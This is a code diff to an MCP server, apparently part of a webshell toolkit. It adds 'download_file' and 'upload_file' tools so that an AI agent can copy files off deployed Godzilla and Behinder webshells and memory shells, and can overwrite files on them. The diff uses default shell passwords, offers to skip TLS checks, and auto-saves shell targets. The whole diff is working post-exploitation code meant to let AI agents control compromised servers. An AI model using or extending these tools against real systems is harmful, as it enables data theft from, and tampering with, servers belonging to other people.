@@ -1,12 +1,29 @@
 import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
 import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
+import { writeFileSync } from "node:fs";
 import { z } from "zod";
 
 import { MemPartyClient } from "../api/client.js";
-import { execBehinder, testBehinder } from "../connect/behinder.js";
-import { execGodzilla, testGodzilla } from "../connect/godzilla.js";
+import {
+  downloadBehinder,
+  execBehinder,
+  testBehinder,
+  uploadBehinder,
+} from "../connect/behinder.js";
+import {
+  downloadGodzilla,
+  execGodzilla,
+  testGodzilla,
+  uploadGodzilla,
+} from "../connect/godzilla.js";
 import { testSuo5 } from "../connect/suo5.js";
-import type { ConnectTestResult, ExecResult } from "../connect/types.js";
+import type {
+  ConnectTestResult,
+  DownloadResult,
+  ExecResult,
+  TransferResult,
+} from "../connect/types.js";
+import { readUploadFile, resolveDownloadPath } from "../core/localfile.js";
 import { logOp, opLogPath, readOps, truncateOutput, type OpCategory } from "../core/oplog.js";
 import {
   autoSaveShell,
@@ -151,6 +168,46 @@ const execInput = {
     .describe("gate header value from generate_memshell shellToolConfig — required for MemShellParty shells"),
   insecure: z.boolean().optional().describe("skip TLS certificate verification"),
   timeoutMs: z.number().optional().describe("request timeout in milliseconds (default 30000)"),
+};
+
+/** Connection fields shared by download_file / upload_file (no command/os). */
+const transferConnInput = {
+  name: execInput.name,
+  url: execInput.url,
+  tool: execInput.tool,
+  pass: execInput.pass,
+  key: execInput.key,
+  headerName: execInput.headerName,
+  headerValue: execInput.headerValue,
+  insecure: execInput.insecure,
+  timeoutMs: execInput.timeoutMs,
+  remoteCharset: z
+    .string()
+    .optional()
+    .describe(
+      "godzilla only: charset for non-ASCII remote paths (any Java label, e.g. GBK; default UTF-8)",
+    ),
+};
+
+const downloadInput = {
+  ...transferConnInput,
+  remotePath: z.string().describe("remote file path to download"),
+  localPath: z
+    .string()
+    .optional()
+    .describe(
+      "local destination (default: ./<remote basename>; an existing directory keeps the basename)",
+    ),
+  force: z
+    .boolean()
+    .optional()
+    .describe("overwrite the local file when it already exists (default: refuse)"),
+};
+
+const uploadInput = {
+  ...transferConnInput,
+  localPath: z.string().describe("local file to upload (max 64 MiB)"),
+  remotePath: z.string().describe("remote destination path (overwritten when it exists)"),
 };
 
 const targetSaveInput = {
@@ -472,6 +529,182 @@ export function createMcpServer(client: MemPartyClient): McpServer {
   );
 
   server.registerTool(
+    "download_file",
+    {
+      title: "Download file from shell",
+      description:
+        "Download a file from a deployed Godzilla / Behinder shell to the local machine. " +
+        "Chunked transfer with integrity verification (Godzilla: remote size; Behinder: MD5). " +
+        "Pass a saved target `name`, or url+tool with the gate header for MemShellParty shells. " +
+        "The local file is never overwritten unless force=true. On success the profile is " +
+        "auto-saved and the canonical name returned as `savedAs`.",
+      inputSchema: downloadInput,
+    },
+    async (args) => {
+      try {
+        const conn = resolveConnection(args.name, {
+          url: args.url,
+          tool: args.tool,
+          pass: args.pass,
+          key: args.key,
+          headerName: args.headerName,
+          headerValue: args.headerValue,
+          insecure: args.insecure,
+        });
+        const common = {
+          headerName: conn.headerName,
+          headerValue: conn.headerValue,
+          extraHeaders: conn.extraHeaders,
+          timeoutMs: args.timeoutMs,
+          insecure: conn.insecure,
+        };
+        // decide + validate the local destination before touching the network
+        const localPath = resolveDownloadPath(args.remotePath, args.localPath, args.force ?? false);
+
+        let result: DownloadResult;
+        switch (conn.tool) {
+          case "godzilla":
+            result = await downloadGodzilla(
+              conn.url,
+              conn.pass ?? "pass",
+              conn.key ?? "key",
+              args.remotePath,
+              { ...common, remoteCharset: args.remoteCharset },
+            );
+            break;
+          case "behinder":
+            result = await downloadBehinder(
+              conn.url,
+              conn.pass ?? "rebeyond",
+              args.remotePath,
+              common,
+            );
+            break;
+          default:
+            throw new Error(`download supports godzilla | behinder (got ${String(conn.tool)})`);
+        }
+        if (result.ok && result.data !== undefined) {
+          try {
+            writeFileSync(localPath, result.data);
+          } catch (err) {
+            result = {
+              ...result,
+              ok: false,
+              error: `download succeeded but writing ${localPath} failed: ${(err as Error).message}`,
+            };
+          }
+        }
+        let savedAs: string | undefined;
+        if (result.ok && conn.targetName === undefined) {
+          savedAs = autoSaveShell(conn);
+          conn.targetName = savedAs;
+        }
+        logOp({
+          category: "download",
+          action: "download",
+          targetName: conn.targetName,
+          url: conn.url,
+          tool: conn.tool,
+          ok: result.ok,
+          durationMs: result.durationMs,
+          detail: result.ok
+            ? `${args.remotePath} -> ${localPath} (${result.bytes ?? 0} bytes)`
+            : undefined,
+          error: result.error,
+          meta: { remotePath: args.remotePath, localPath, bytes: result.bytes },
+        });
+        const { data: _data, ...wire } = result;
+        return jsonContent({ ...wire, localPath, savedAs });
+      } catch (err) {
+        return errorContent(err);
+      }
+    },
+  );
+
+  server.registerTool(
+    "upload_file",
+    {
+      title: "Upload file to shell",
+      description:
+        "Upload a local file to a deployed Godzilla / Behinder shell, overwriting the remote " +
+        "path (max 64 MiB). Chunked transfer with integrity verification (Godzilla: remote " +
+        "size; Behinder: MD5). Pass a saved target `name`, or url+tool with the gate header " +
+        "for MemShellParty shells. On success the profile is auto-saved and the canonical " +
+        "name returned as `savedAs`.",
+      inputSchema: uploadInput,
+    },
+    async (args) => {
+      try {
+        const conn = resolveConnection(args.name, {
+          url: args.url,
+          tool: args.tool,
+          pass: args.pass,
+          key: args.key,
+          headerName: args.headerName,
+          headerValue: args.headerValue,
+          insecure: args.insecure,
+        });
+        const common = {
+          headerName: conn.headerName,
+          headerValue: conn.headerValue,
+          extraHeaders: conn.extraHeaders,
+          timeoutMs: args.timeoutMs,
+          insecure: conn.insecure,
+        };
+        // read + validate the local file before touching the network
+        const data = readUploadFile(args.localPath);
+
+        let result: TransferResult;
+        switch (conn.tool) {
+          case "godzilla":
+            result = await uploadGodzilla(
+              conn.url,
+              conn.pass ?? "pass",
+              conn.key ?? "key",
+              args.remotePath,
+              data,
+              { ...common, remoteCharset: args.remoteCharset },
+            );
+            break;
+          case "behinder":
+            result = await uploadBehinder(
+              conn.url,
+              conn.pass ?? "rebeyond",
+              args.remotePath,
+              data,
+              common,
+            );
+            break;
+          default:
+            throw new Error(`upload supports godzilla | behinder (got ${String(conn.tool)})`);
+        }
+        let savedAs: string | undefined;
+        if (result.ok && conn.targetName === undefined) {
+          savedAs = autoSaveShell(conn);
+          conn.targetName = savedAs;
+        }
+        logOp({
+          category: "upload",
+          action: "upload",
+          targetName: conn.targetName,
+          url: conn.url,
+          tool: conn.tool,
+          ok: result.ok,
+          durationMs: result.durationMs,
+          detail: result.ok
+            ? `${args.localPath} -> ${args.remotePath} (${result.bytes ?? 0} bytes)`
+            : undefined,
+          error: result.error,
+          meta: { localPath: args.localPath, remotePath: args.remotePath, bytes: result.bytes },
+        });
+        return jsonContent(savedAs !== undefined ? { ...result, savedAs } : result);
+      } catch (err) {
+        return errorContent(err);
+      }
+    },
+  );
+
+  server.registerTool(
     "target_save",
     {
       title: "Save shell target",
@@ -637,7 +870,7 @@ export function createMcpServer(client: MemPartyClient): McpServer {
         "newest first. Filter by category and/or target.",
       inputSchema: {
         category: z
-          .enum(["gen", "probe", "connect", "exec", "save", "note", "remove"])
+          .enum(["gen", "probe", "connect", "exec", "download", "upload", "save", "note", "remove"])
           .optional()
           .describe("operation category"),
         target: z
